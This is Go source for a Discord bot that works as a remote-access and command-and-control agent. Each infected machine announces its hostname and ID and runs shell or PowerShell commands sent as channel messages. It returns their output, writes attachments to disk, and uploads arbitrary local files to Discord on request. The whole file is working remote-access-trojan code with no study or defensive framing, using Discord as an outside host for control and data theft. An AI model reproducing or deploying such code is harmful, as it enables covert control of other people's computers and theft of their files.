package main

import (
	"fmt"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path"
	"runtime"
	"strings"
	"syscall"

	"github.com/bwmarrin/discordgo"
	"github.com/google/uuid"
)

//global stuff for shortcuts
var p = fmt.Println

var ID = "" // ID used for telling machines apart. Will be based on MAC address
var name = "HOSTNAME PLACEHOLDER"

func main() {

	// Generating the node's unique ID
	ID = generateGUID()

	// Setting the users hostname
	name, _ = os.Hostname()

	// Where to download files to

	// Setting up the token (add the token manually here if you want it to be compiled with the code)
	btok, _ := ioutil.ReadFile("token")
	token := string(btok)
	token = strings.Replace(token, "\n", "", -1)

	// Setting up Bot connection
	dg, err := discordgo.New("Bot " + token)
	if err != nil {
		p(err.Error())
		return
	}

	dg.AddHandler(messageHandler)

	err = dg.Open()

	if err != nil {
		p(err.Error())
		return
	}

	p("Bot is up")

	// Wait here until CTRL-C or other term signal is received.
	p("Bot is now running. Press CTRL-C to exit.")
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, os.Kill)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()

}

func messageHandler(s *discordgo.Session, m *discordgo.MessageCreate) {

	// Ignore all messages created by the bot itself
	if m.Author.ID == s.State.User.ID {
		return
	}

	if strings.Contains(strings.ToLower(m.Content), "!test") {
		s.ChannelMessageSend(m.ChannelID, "testSuccesfull")
	}

	// Running command if sent to all nodes
	if strings.HasPrefix(m.Content, "! ") {
		command_string := m.Content[2:len(m.Content)] // get everything after the '! '
		p(command_string)

		out, errorMessage := runCommand(command_string)

		if errorMessage != "" {
			p(errorMessage)
			s.ChannelMessageSend(m.ChannelID, "```"+errorMessage+"```")
			return
		}
		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
	}

	// Running commands that are sent via ID
	if strings.HasPrefix(m.Content, ID+": ") {
		command_string := m.Content[len(ID+": "):len(m.Content)]
		p(command_string)

		out, errorMessage := runCommand(command_string)
		if errorMessage != "" {
			p(errorMessage)
			s.ChannelMessageSend(m.ChannelID, "```"+errorMessage+"```")
			return
		}
		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
	}

	// Running commands that are sent via hostname
	if strings.HasPrefix(m.Content, name+": ") {
		command_string := m.Content[len(name+": "):len(m.Content)]
		p(command_string)

		out, errorMessage := runCommand(command_string)
		if errorMessage != "" {
			p(errorMessage)
			s.ChannelMessageSend(m.ChannelID, "```"+errorMessage+"```")
			return
		}
		s.ChannelMessageSend(m.ChannelID, "```"+string(out)+"```")
	}

	// Roll call
	if strings.ToLower(m.Content) == "role call" {
		name, err := os.Hostname()
		if err != nil {
			p(err.Error())
			return
		}

		outString := "Hostname: " + name + "\n" + "ID: " + ID + "\n" + "Platform: " + runtime.GOOS + " " + runtime.GOARCH

		s.ChannelMessageSend(m.ChannelID, "```"+outString+"```")

	}

	// Download file
	if strings.ToLower(m.Content) == "download" {
		if m.Attachments != nil {
			p(m.Attachments)

			for index, element := range m.Attachments {
				// index is the index where we are
				// element is the element from someSlice for where we are

				p("atachment: " + string(index) + " " + element.ProxyURL)

				filename := path.Base(element.ProxyURL)

				DownloadFile(filename, element.ProxyURL)

			}

		}
	}

	// Send file to chat
	if strings.HasPrefix(m.Content, "get-file"+": ") {

		path := m.Content[len("get-file: "):len(m.Content)]

		// creating the IO reader, for sending
		file, err := os.Open(path)
		if err != nil {
			s.ChannelMessageSend(m.ChannelID, "There was an error opening the file")
		}

		// Sending the file to the channel
		_, err = s.ChannelFileSend(m.ChannelID, path, file)
		if err != nil {
			fmt.Println(err)
			s.ChannelMessageSend(m.ChannelID, "There was an error sending the file")
		}
	}

	p(m.Author.Username, ": ", m.Content)

}

func runCommand(command string) (outString string, errorMessage string) {

	var shell string
	errorMessage = ""

	// Selecting which shell to use
	if runtime.GOOS == "windows" {
		shell = "powershell.exe"
	} else {
		shell = "sh"
	}

	// Change directory
	if strings.HasPrefix(command, "cd ") {

		dir := command[3:] // get the first three chars

		os.Chdir(dir)

		p(dir)

		// run command, and if it causes an error create an error
		out, err := exec.Command(shell, "-c", "pwd").Output()
		if err != nil {
			p(err.Error())
			errorMessage = err.Error()

			return
		}

		outString = string(out)
		return
	}

	// run command, and if it causes an error create an error
	out, err := exec.Command(shell, "-c", command).Output()
	if err != nil {
		p(err.Error())
		errorMessage = err.Error()

		return
	}

	outString = string(out)

	return

}

func generateGUID() string {

	// MacOS doesn't seem to like the hardware addr GUID thing. So guess we going random number
	if runtime.GOOS == "darwin" {
		id := uuid.New()
		return id.String()
	}

	// gets the machines network interfaces
	ifas, err := net.Interfaces()
	if err != nil {
		return ""
	}

	address := ifas[0].HardwareAddr.String()       // gets the MAC(hardware) address from the first network interface
	address = strings.ReplaceAll(address, ":", "") // removes the : so it's easier to copy and paste

	return string(address)
}

func DownloadFile(filepath string, url string) error {

	// Get the data
	resp, err := http.Get(url)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	// Create the file
	out, err := os.Create(filepath)
	if err != nil {
		return err
	}
	defer out.Close()

	// Write the body to file
	_, err = io.Copy(out, resp.Body)
	return err
}
